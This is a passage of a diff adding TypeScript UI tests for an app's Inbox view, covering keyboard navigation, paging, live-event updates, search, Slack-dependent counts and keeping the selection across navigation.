+    const { answers } = inbox([a, b, c]);
+    renderApp('/inbox');
+    await findText('First?');
+    key('j');
+    await findText('Second?');
+    key('1');
+    key('Enter');
+    await waitFor(() => {
+      expect(selectedCard().textContent).toContain('Third?');
+    });
+    expect(answers).toEqual([{ id: b.id, body: { choice: 'A', record: null } }]);
+    expect(rows()).toHaveLength(2);
+  });
+
+  it('selects the next row, and drops the draft, when an event resolves the selected card', async () => {
+    const [a, b] = [question('First?', 0), question('Second?', 1)] as const;
+    const { answers, served } = inbox([a, b]);
+    const sockets: { send: (data: string) => void }[] = [];
+    server.use(
+      eventStream.addEventListener('connection', ({ client }) => {
+        sockets.push(client);
+      }),
     );
+    renderApp('/inbox');
+    await findText('First?');
+    key('1');
+    fireEvent.change(screen.getByLabelText('Note for the agent (optional)'), {
+      target: { value: 'half written' },
+    });
+    await waitFor(() => {
+      expect(sockets).toHaveLength(1);
+    });
+
+    served.open = [b];
+    act(() => {
+      sockets[0]?.send(
+        JSON.stringify(
+          daemonEvent({ seq: 1, type: 'inbox.changed', entityType: 'inbox', entityId: a.id }),
+        ),
+      );
+    });
+    await waitFor(() => {
+      expect(selectedCard().textContent).toContain('Second?');
+    });
+    expect(screen.getByLabelText<HTMLTextAreaElement>('Note for the agent (optional)').value).toBe(
+      '',
+    );
+    expect(within(selectedCard()).queryByRole('radio', { checked: true })).toBeNull();
+    expect(answers).toEqual([]);
+  });
+
+  it('keeps the selected row and its draft when a search still holds the row', async () => {
+    const cards = [
+      question('Alpha retry?', 0),
+      question('Beta retry?', 1),
+      question('Gamma other?', 2),
+    ];
+    inbox(cards);
+    serveInboxRows({ open: cards });
+    renderApp('/inbox');
+    await findText('Alpha retry?');
+    key('j');
+    await waitFor(() => {
+      expect(selectedCard().textContent).toContain('Beta retry?');
+    });
+    fireEvent.change(screen.getByLabelText('Note for the agent (optional)'), {
+      target: { value: 'half written' },
+    });
+    fireEvent.change(screen.getByRole('textbox', { name: 'Search the Inbox' }), {
+      target: { value: 'retry' },
+    });
+    await waitFor(() => {
+      expect(rows()).toHaveLength(2);
+    });
+    expect(selectedCard().textContent).toContain('Beta retry?');
+    expect(screen.getByLabelText<HTMLTextAreaElement>('Note for the agent (optional)').value).toBe(
+      'half written',
+    );
+  });
+
+  describe('paging with the keys', () => {
+    const pageTwo = (query: Record<string, string>): boolean => query['after'] !== undefined;
+    const pageTwoReads = (asked: Record<string, string>[]): number => asked.filter(pageTwo).length;
+    const viewport = (): HTMLElement => {
+      const el = screen
+        .getByRole('listbox', { name: 'Inbox' })
+        .closest('[data-scrollarea-viewport]');
+      if (!(el instanceof HTMLElement)) throw new Error('no viewport');
+      return el;
+    };
+    const toEnd = (): void => {
+      viewport().scrollTop = 60 * 52;
+      fireEvent.scroll(viewport());
+    };
+    /** Moves to the last of the 50 loaded rows. */
+    const toLastLoaded = (): void => {
+      for (let i = 0; i < 49; i += 1) key('j');
+    };
+
+    it('reads page two on j past the loaded end, shows a placeholder, then selects the next row', async () => {
+      let release: () => void = () => undefined;
+      const gate = new Promise<void>((resolve) => {
+        release = resolve;
+      });
+      const all = numbered(52);
+      const asked: Record<string, string>[] = [];
+      inbox(all, (query) => {
+        asked.push(query);
+        return pageTwo(query) ? gate : undefined;
+      });
+      renderApp('/inbox');
+      await findText('Card 0');
+      toLastLoaded();
+      expect(selectedCard().textContent).toContain('Card 49');
+      expect(pageTwoReads(asked)).toBe(0);
+
+      key('j');
+      await waitFor(() => {
+        expect(pageTwoReads(asked)).toBe(1);
+      });
+      // Another j while the page is on its way asks for nothing and moves once when it lands.
+      key('j');
+      toEnd();
+      expect(await screen.findByText('Loading more')).toBeTruthy();
+      expect(selectedCard().textContent).toContain('Card 49');
+      expect(pageTwoReads(asked)).toBe(1);
+
+      release();
+      await waitFor(() => {
+        expect(selectedCard().textContent).toContain('Card 50');
+      });
+      expect(selectedCard().textContent).not.toContain('Card 51');
+      expect(pageTwoReads(asked)).toBe(1);
+    });
+
+    it('drops the pending move when the builder picks another row before the page lands', async () => {
+      let release: () => void = () => undefined;
+      const gate = new Promise<void>((resolve) => {
+        release = resolve;
+      });
+      const asked: Record<string, string>[] = [];
+      inbox(numbered(52), (query) => {
+        asked.push(query);
+        return pageTwo(query) ? gate : undefined;
+      });
+      const { queryClient } = renderApp('/inbox');
+      await findText('Card 0');
+      toLastLoaded();
+      key('j');
+      await waitFor(() => {
+        expect(pageTwoReads(asked)).toBe(1);
+      });
+      key('k');
+      expect(selectedCard().textContent).toContain('Card 48');
+      release();
+      await waitFor(() => {
+        expect(queryClient.isFetching()).toBe(0);
+      });
+      expect(selectedCard().textContent).toContain('Card 48');
+    });
+
+    it('does nothing at the true end, and leaves the arrow its default', async () => {
+      const asked: Record<string, string>[] = [];
+      inbox(numbered(2), (query) => {
+        asked.push(query);
+        return undefined;
+      });
+      renderApp('/inbox');
+      await findText('Card 0');
+      key('j');
+      expect(selectedCard().textContent).toContain('Card 1');
+      key('j');
+      expect(selectedCard().textContent).toContain('Card 1');
+      expect(fireEvent.keyDown(document.body, { key: 'ArrowDown' })).toBe(true);
+      expect(pageTwoReads(asked)).toBe(0);
+    });
+
+    it('says a page failed, keeps the selection, and drops the move', async () => {
+      const asked: Record<string, string>[] = [];
+      inbox(numbered(52), (query) => {
+        asked.push(query);
+        return pageTwo(query) ? Promise.reject(new Error('offline')) : undefined;
+      });
+      renderApp('/inbox');
+      await findText('Card 0');
+      toLastLoaded();
+      key('j');
+      await waitFor(() => {
+        expect(pageTwoReads(asked)).toBe(1);
+      });
+      toEnd();
+      expect(await screen.findByText("Couldn't load more")).toBeTruthy();
+      expect(selectedCard().textContent).toContain('Card 49');
+      // The move was dropped with the page: nothing moves later, and the next j asks again.
+      expect(selectedCard().textContent).not.toContain('Card 50');
+      key('j');
+      await waitFor(() => {
+        expect(pageTwoReads(asked)).toBe(2);
+      });
+    });
+  });
+
+  it('selects the next row when a 10db card leaves', async () => {
+    const check = (tools: unknown[]): void => {
+      server.use(
+        http.get(daemonUrl('/system'), () =>
+          HttpResponse.json(
+            SystemCheckDto.parse({
+              loginEnv: { source: 'login_shell', warning: null },
+              claudeCode: { verifiedOn: '2.1.302', warning: null },
+              codex: { verifiedOn: '0.167.0', warning: null },
+              tools,
+            }),
+          ),
+        ),
+      );
+    };
+    inbox([color, corners]);
+    check([{ name: 'git', path: null, version: null, required: true, signedIn: null }]);
+    const { queryClient } = renderApp('/inbox');
+    expect(await findText('git was not found where 10db looks for it')).toBeTruthy();
+    expect(rows()).toHaveLength(3);
+
+    check([]);
+    await queryClient.invalidateQueries({ queryKey: queryKeys.system });
+    await waitFor(() => {
+      expect(rows()).toHaveLength(2);
+    });
+    expect(selectedCard().textContent).toContain('Which badge color?');
+  });
+
+  describe("a question's last messages", () => {
+    const at = '2026-10-13T12:00:00.000Z';
+
+    it('shows up to three lines as text, and none for a flag', async () => {
+      const asked: string[] = [];
+      inbox([color, flag('Write outside every claim', 'docs/notes.md')]);
+      server.use(
+        http.get(daemonUrl('/inbox/:id/context'), ({ params }) => {
+          asked.push(String(params['id']));
+          return HttpResponse.json({
+            messages: [
+              { author: 'builder', text: 'Use teal', at },
+              { author: 'agent', text: '<b>Teal</b> it is', at },
+            ],
+          });
+        }),
+      );
+      renderApp('/inbox');
+      await findText('Last messages');
+      expect(getText('You: Use teal')).toBeTruthy();
+      expect(getText('Agent: <b>Teal</b> it is')).toBeTruthy();
+      expect(selectedCard().querySelector('b')).toBeNull();
+
+      key('j');
+      await findText('docs/notes.md');
+      expect(queryText('Last messages')).toBeNull();
+      expect(asked).toEqual([color.id]);
+    });
+
+    it('shows nothing while it loads, and nothing when it is empty', async () => {
+      inbox([color]);
+      renderApp('/inbox');
+      await findText('Which badge color?');
+      await waitFor(() => {
+        expect(screen.queryByRole('progressbar')).toBeNull();
+      });
+      expect(queryText('Last messages')).toBeNull();
+    });
+  });
+
+  it("shows the session's title on line 2 of a chat's card", async () => {
+    const chat = chatDto({ projectId: project, title: 'Login fails after sleep' });
+    const card = inboxItemDto({
+      kind: 'question',
+      title: 'Which fix?',
+      body: 'Pick one.',
+      projectId: project,
+      detail: { conversationId: chat.conversationId },
+    });
+    inbox([card]);
+    server.use(http.get(daemonUrl('/chats'), () => HttpResponse.json([chat])));
+    renderApp('/inbox');
+    const row = await findRow('Which fix?');
+    await waitFor(() => {
+      expect(row.textContent).toContain('Login fails after sleep');
+    });
+    expect(row.textContent).toContain('Chat');
+    expect(row.textContent).not.toContain('Pick one.');
+  });
+
+  it('closes the panel sheet when a row is picked, though the page stays', async () => {
+    viewportWidth(800);
+    inbox([color, corners]);
+    const { router } = renderApp('/inbox');
+    await findText('Which badge color?');
+    const panel = (): string | null =>
+      document.querySelector('[data-panel]')?.getAttribute('data-panel') ?? null;
+    fireEvent.keyDown(document, { key: '\\', metaKey: true });
+    await waitFor(() => {
+      expect(panel()).toBe('sheet');
+    });
+
+    fireEvent.click(await findRow('Round or square corners?'));
+    await waitFor(() => {
+      expect(panel()).toBe('hidden');
+    });
+    expect(router.state.location.pathname).toBe('/inbox');
+    expect(selectedCard().textContent).toContain('Round or square corners?');
+  });
+
+  describe("the head's state switch", () => {
+    const sent = inboxItemDto({
+      title: 'Which tone?',
+      send: sendDto({ state: 'sent', sentAt: '2026-10-13T12:00:00.000Z' }),
+    });
+
+    it('counts Open in attention and Waiting only while Slack is connected', async () => {
+      serve();
+      serveInboxRows({ open: [color, corners], waiting: [sent] });
+      server.use(
+        http.get(daemonUrl('/slack'), () =>
+          HttpResponse.json(slackConnection({ state: 'connected', teamName: 'Acme' })),
+        ),
+      );
+      renderApp('/inbox');
+      expect(await screen.findByRole('radio', { name: /^Open\s?2$/ })).toBeTruthy();
+      expect(await screen.findByRole('radio', { name: /^Waiting\s?1$/ })).toBeTruthy();
+      expect(screen.getByRole('radio', { name: 'Resolved' })).toBeTruthy();
+    });
+
+    it('shows no Waiting count while Slack is off', async () => {
+      serve();
+      serveInboxRows({ open: [color], waiting: [sent] });
+      renderApp('/inbox');
+      await screen.findByRole('radio', { name: /^Open\s?1$/ });
+      expect(screen.getByRole('radio', { name: 'Waiting' })).toBeTruthy();
+    });
+
+    it('changes the state in the URL', async () => {
+      inbox([color]);
+      const { router } = renderApp('/inbox');
+      fireEvent.click(await screen.findByRole('radio', { name: 'Waiting' }));
+      await waitFor(() => {
+        expect(router.state.location.search).toEqual({ state: 'waiting' });
+      });
+      fireEvent.click(screen.getByRole('radio', { name: /^Open/ }));
+      await waitFor(() => {
+        expect(router.state.location.search).toEqual({});
+      });
+    });
+  });
+});
+
+describe('leaving the Inbox and coming back', () => {
+  const question = (title: string, at: number): InboxItemDto =>
+    inboxItemDto({
+      kind: 'question',
+      title,
+      body: '',
+      options: [
+        { label: 'A', description: '' },
+        { label: 'B', description: '' },
+      ],
+      projectId: project,
+      createdAt: new Date(Date.UTC(2026, 9, 13, 12, 0, at)).toISOString(),
+    });
+  const four = [
+    question('One?', 0),
+    question('Two?', 1),
+    question('Three?', 2),
+    question('Four?', 3),
+  ];
+  const viewport = (): HTMLElement => {
+    const el = document.querySelector('[data-inbox-list] .mantine-ScrollArea-viewport');
+    if (!(el instanceof HTMLElement)) throw new Error('no list viewport');
+    return el;
+  };
+  const railLink = (name: string): HTMLElement => {
+    const link = [...document.querySelectorAll<HTMLElement>('a[data-rail-item]')].find((a) =>
+      a.textContent.startsWith(name),
+    );
+    if (link === undefined) throw new Error(`no rail link ${name}`);
+    return link;
+  };
+
+  afterEach(() => {
+    lastInboxSearch.set({});
+    for (const state of ['open', 'waiting', 'resolved'] as const) {
+      rememberSelected(state, null);
+      rememberScroll(state, 0);
+    }
+  });
+
+  it('keeps the filter, the selected row and the scroll through the rail', async () => {
+    const { served } = inbox(four);
+    const asked = serveInboxRows(served);
+    const { router } = renderApp(`/inbox?project=${project}`);
+    await findText('One?');
+    fireEvent.click(await findRow('Three?'));
+    await waitFor(() => {
+      expect(selectedCard().textContent).toContain('Three?');
+    });
+    viewport().scrollTop = 80;
+    fireEvent.scroll(viewport());
+
+    fireEvent.click(railLink('Board'));
+    await waitFor(() => {
+      expect(router.state.location.pathname).toBe('/board');
+    });
+    fireEvent.click(railLink('Inbox'));
+    await waitFor(() => {
+      expect(router.state.location.pathname).toBe('/inbox');
+    });
+    expect(router.state.location.search).toEqual({ project });
+    await findRow('Three?');
+    await waitFor(() => {
+      expect(selectedCard().textContent).toContain('Three?');
+    });
+    expect(viewport().scrollTop).toBe(80);
+    expect(asked.length).toBeGreaterThan(0);
+  });
+
+  it('shows the list without a card resolved while away, and asks for nothing while away', async () => {
+    const { served } = inbox(four);
+    const sockets: { send: (data: string) => void }[] = [];
+    server.use(
+      eventStream.addEventListener('connection', ({ client }) => {
+        sockets.push(client);
+      }),
+    );
+    const asked = serveInboxRows(served);
+    const { router } = renderApp('/inbox');
+    await findText('One?');
+    await waitFor(() => {
+      expect(sockets).toHaveLength(1);
+    });
+    fireEvent.click(railLink('Board'));
+    await waitFor(() => {
+      expect(router.state.location.pathname).toBe('/board');
+    });
+    const before = asked.length;
+    const gone = four[1];
+    if (gone === undefined) throw new Error('no card');
+    served.open = four.filter((card) => card.id !== gone.id);
+    act(() => {
+      sockets[0]?.send(
+        JSON.stringify(
+          daemonEvent({ seq: 1, type: 'inbox.changed', entityType: 'inbox', entityId: gone.id }),
+        ),
+      );
+    });
+    await new Promise((resolve) => setTimeout(resolve, 50));
+    expect(asked.slice(before).filter((q) => q['card'] !== undefined)).toEqual([]);
+
+    fireEvent.click(railLink('Inbox'));
+    await findRow('One?');
+    await waitFor(() => {
+      expect(rows()).toHaveLength(3);
+    });
+    expect(rows().some((row) => row.textContent.includes('Two?'))).toBe(false);
+  });
+
+  it('puts focus on the selected row when arriving, so j moves at once', async () => {
+    inbox(four);
+    const { router } = renderApp('/board');
+    await waitFor(() => {
+      expect(railLink('Inbox')).toBeTruthy();
+    });
+    fireEvent.click(railLink('Inbox'));
+    await waitFor(() => {
+      expect(router.state.location.pathname).toBe('/inbox');
+    });
+    await findRow('One?');
+    await waitFor(() => {
+      expect(document.activeElement).toBe(rowOf('One?'));
+    });
+    fireEvent.keyDown(document.activeElement ?? document.body, { key: 'j' });
+    await waitFor(() => {
+      expect(selectedCard().textContent).toContain('Two?');
+    });
+    expect(document.activeElement).toBe(rowOf('Two?'));
+  });
+
+  it('leaves focus alone when the builder is somewhere else', async () => {
+    inbox(four);
+    renderApp('/inbox');
+    await findText('One?');
+    const field = screen.getByLabelText('Note for the agent (optional)');
+    field.focus();
+    key('j');
+    await findText('Two?');
+    // The next card is a new card with its own fields, so the old one goes; focus is not pulled onto a row.
+    expect(document.activeElement).not.toBe(rowOf('Two?'));
+  });
+
+  it('asks for the next question row context before that row is selected', async () => {
+    const contexts: string[] = [];
+    inbox(four);
+    server.use(
+      http.get(daemonUrl('/inbox/:id/context'), ({ params }) => {
+        contexts.push(String(params['id']));
+        return HttpResponse.json({ messages: [] });
+      }),
+    );
+    renderApp('/inbox');
+    await findText('One?');
+    const [one, two, three] = four;
+    await waitFor(() => {
+      expect(contexts).toContain(two?.id);
+    });
+    expect(contexts).not.toContain(three?.id);
+    expect(contexts).toContain(one?.id);
   });
 });
